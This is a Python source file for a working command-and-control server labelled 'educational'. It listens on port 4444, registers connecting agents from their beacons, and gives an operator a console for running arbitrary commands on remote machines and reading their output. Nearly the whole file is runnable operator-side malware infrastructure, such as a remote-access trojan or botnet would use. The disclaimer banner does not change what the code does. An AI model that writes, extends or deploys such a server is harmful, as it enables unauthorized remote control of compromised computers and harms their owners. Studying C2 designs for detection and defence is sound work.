#!/usr/bin/env python3
"""
Educational C2 (Command and Control) Server
This is for educational purposes only - demonstrates C2 architecture concepts
"""

import socket
import threading
import json
import time
from datetime import datetime
import base64


class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.client_id_counter = 0
        self.server_socket = None
        self.running = False
        
    def start(self):
        """Start the C2 server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.running = True
        
        print(f"[+] C2 Server started on {self.host}:{self.port}")
        print(f"[+] Waiting for agents to connect...")
        
        # Start command interface in separate thread
        cmd_thread = threading.Thread(target=self.command_interface)
        cmd_thread.daemon = True
        cmd_thread.start()
        
        # Accept connections
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                self.handle_new_client(client_socket, address)
            except Exception as e:
                if self.running:
                    print(f"[-] Error accepting connection: {e}")
                    
    def handle_new_client(self, client_socket, address):
        """Handle new agent connection"""
        self.client_id_counter += 1
        client_id = self.client_id_counter
        
        client_info = {
            'id': client_id,
            'socket': client_socket,
            'address': address,
            'connected_at': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat()
        }
        
        self.clients[client_id] = client_info
        print(f"\n[+] New agent connected: ID={client_id} from {address[0]}:{address[1]}")
        
        # Start handler thread for this client
        client_thread = threading.Thread(target=self.handle_client, args=(client_id,))
        client_thread.daemon = True
        client_thread.start()
        
    def handle_client(self, client_id):
        """Handle communication with a specific agent"""
        client = self.clients[client_id]
        client_socket = client['socket']
        
        try:
            # Receive initial beacon with system info
            data = client_socket.recv(4096).decode('utf-8')
            if data:
                beacon = json.loads(data)
                client['system_info'] = beacon
                print(f"[+] Agent {client_id} beacon: {beacon.get('hostname', 'unknown')}")
                
            while self.running:
                # Keep connection alive with heartbeat
                time.sleep(1)
                
        except Exception as e:
            print(f"[-] Agent {client_id} disconnected: {e}")
            self.remove_client(client_id)
            
    def send_command(self, client_id, command):
        """Send command to specific agent"""
        if client_id not in self.clients:
            print(f"[-] Agent {client_id} not found")
            return False
            
        try:
            client = self.clients[client_id]
            cmd_data = json.dumps({
                'command': command,
                'timestamp': datetime.now().isoformat()
            })
            client['socket'].send(cmd_data.encode('utf-8'))
            
            # Wait for response
            response = client['socket'].recv(8192).decode('utf-8')
            result = json.loads(response)
            
            print(f"\n[+] Response from Agent {client_id}:")
            print(f"{result.get('output', 'No output')}")
            return True
            
        except Exception as e:
            print(f"[-] Error sending command to Agent {client_id}: {e}")
            self.remove_client(client_id)
            return False
            
    def remove_client(self, client_id):
        """Remove disconnected client"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            del self.clients[client_id]
            print(f"[-] Agent {client_id} removed")
            
    def list_agents(self):
        """List all connected agents"""
        if not self.clients:
            print("\n[!] No agents connected")
            return
            
        print("\n" + "="*80)
        print(f"{'ID':<5} {'Address':<20} {'Hostname':<20} {'Connected At':<25}")
        print("="*80)
        
        for client_id, client in self.clients.items():
            address = f"{client['address'][0]}:{client['address'][1]}"
            hostname = client.get('system_info', {}).get('hostname', 'N/A')
            connected = client['connected_at']
            print(f"{client_id:<5} {address:<20} {hostname:<20} {connected:<25}")
        print("="*80 + "\n")
        
    def command_interface(self):
        """Interactive command interface"""
        time.sleep(1)  # Let server start message print first
        
        print("\n" + "="*80)
        print("C2 Command Interface")
        print("="*80)
        print("Commands:")
        print("  list                    - List all connected agents")
        print("  use <agent_id>          - Interact with specific agent")
        print("  exec <agent_id> <cmd>   - Execute command on agent")
        print("  exit                    - Shutdown C2 server")
        print("="*80 + "\n")
        
        while self.running:
            try:
                cmd = input("C2> ").strip()
                
                if not cmd:
                    continue
                    
                parts = cmd.split(maxsplit=2)
                command = parts[0].lower()
                
                if command == 'list':
                    self.list_agents()
                    
                elif command == 'exec' and len(parts) >= 3:
                    try:
                        agent_id = int(parts[1])
                        agent_cmd = parts[2]
                        self.send_command(agent_id, agent_cmd)
                    except ValueError:
                        print("[-] Invalid agent ID")
                        
                elif command == 'use' and len(parts) >= 2:
                    try:
                        agent_id = int(parts[1])
                        if agent_id in self.clients:
                            self.interactive_session(agent_id)
                        else:
                            print(f"[-] Agent {agent_id} not found")
                    except ValueError:
                        print("[-] Invalid agent ID")
                        
                elif command == 'exit':
                    print("[!] Shutting down C2 server...")
                    self.shutdown()
                    break
                    
                else:
                    print("[-] Unknown command. Type 'help' for available commands")
                    
            except KeyboardInterrupt:
                print("\n[!] Use 'exit' command to shutdown")
            except Exception as e:
                print(f"[-] Error: {e}")
                
    def interactive_session(self, agent_id):
        """Interactive session with specific agent"""
        print(f"\n[+] Interactive session with Agent {agent_id}")
        print("[+] Type 'back' to return to main menu\n")
        
        while self.running:
            try:
                cmd = input(f"Agent-{agent_id}> ").strip()
                
                if cmd.lower() == 'back':
                    break
                    
                if cmd:
                    self.send_command(agent_id, cmd)
                    
            except KeyboardInterrupt:
                print("\n[!] Returning to main menu")
                break
                
    def shutdown(self):
        """Shutdown the C2 server"""
        self.running = False
        
        # Close all client connections
        for client_id in list(self.clients.keys()):
            self.remove_client(client_id)
            
        # Close server socket
        if self.server_socket:
            self.server_socket.close()
            
        print("[+] C2 Server shutdown complete")


if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║           Educational C2 Server Framework                 ║
    ║           For Educational Purposes Only                   ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    server = C2Server(host='0.0.0.0', port=4444)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        server.shutdown()
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        server.shutdown()
